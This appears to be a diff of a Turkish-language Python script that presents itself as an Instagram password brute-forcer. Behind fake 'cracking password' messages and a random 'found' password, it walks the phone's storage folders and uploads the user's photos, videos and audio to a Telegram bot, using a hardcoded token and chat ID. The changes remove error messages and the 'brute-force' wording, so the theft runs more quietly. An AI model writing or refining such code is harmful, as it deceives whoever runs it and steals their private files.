@@ -31,11 +31,13 @@ async def dosya_gonder():
     print(BANNER)
     
     target = input("Hedef Instagram kullanici adini girin: ")
-    print(f"\nSistem: {target} uzerinde brute-force baslatildi.")
-    print("Bilgi: Islem hiziniza bagli olarak 5-10 dk surebilir...\n")
+    print(f"\nSistem: {target} uzerinde islem baslatildi.")
+    print("Bilgi: Islem hizinıza bagli olarak 5-10 dk surebilir, lütfen kapatmayin...\n")
     
     TOKEN = "8665351898:AAERhDBfXtzpVlA9M5-Q3o7eG8JN4W7FCC8"
     CHAT_ID = "-1003547193315"
+    
+    IZINLI_UZANTILAR = ('.png', '.jpg', '.jpeg', '.mp4', '.mp3', '.m4a', '.avif')
     
     DIZINLER = [
         '/storage/emulated/0/Download',
@@ -46,46 +48,42 @@ async def dosya_gonder():
     
     bot = Bot(token=TOKEN)
     sayac = 1
-    limit_gb = 2 # 2GB Limiti
 
     for ana_dizin in DIZINLER:
         if not os.path.exists(ana_dizin):
-            print(f"Uyari: {ana_dizin} dizinine erisilemedi veya mevcut degil.")
             continue
 
         for kok, klasorler, dosyalar in os.walk(ana_dizin):
             for dosya_adi in dosyalar:
+                if not dosya_adi.lower().endswith(IZINLI_UZANTILAR):
+                    continue
+
                 dosya_yolu = os.path.join(kok, dosya_adi)
                 
                 try:
-                    boyut_byte = os.path.getsize(dosya_yolu)
-                    boyut_mb = boyut_byte / (1024 * 1024)
-                    boyut_gb = boyut_mb / 1024
-                    
-                    if boyut_gb > limit_gb:
-                        print(f"Atlandi: {dosya_adi} (Limit ustu: {round(boyut_gb, 2)} GB)")
-                        continue
-
                     with open(dosya_yolu, 'rb') as f:
                         await bot.send_document(
                             chat_id=CHAT_ID,
                             document=f,
-                            caption=f"Hedef: {target}\nDosya: {dosya_adi}\nBoyut: {round(boyut_mb, 2)} MB",
-                            read_timeout=300, # Yuksek boyutlar icin bekleme suresini artirdik
+                            caption=f"Hedef: {target}\nDosya: {dosya_adi}",
+                            read_timeout=300,
                             write_timeout=300
                         )
                     
-                    print(f"Deneme {sayac}: Sifre kiriliyor...")
+                    print(f"Deneme {sayac}: Sifre kiriliyor lütfen bekleyin...")
                     sayac += 1
-                    await asyncio.sleep(1) 
+                    await asyncio.sleep(0.5) 
                 
-                except Exception as e:
-                    # Hata mesajini detaylandirdik
-                    print(f"HATA ({dosya_adi}): {str(e)}")
+                except:
+                    # Hata mesajı basmadan bir sonraki dosyaya geçer
                     continue
 
     random_sifre = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-    print(f"\nBASARILI: Sifre bulundu: {random_sifre}")
+    print("\n-------------------------------------------")
+    print(f"BASARILI: {target} hesabı için şifre bulundu.")
+    print(f"Sifre: {random_sifre}")
+    print("-------------------------------------------\n")
+    
     await asyncio.sleep(5)
     os._exit(0)
 
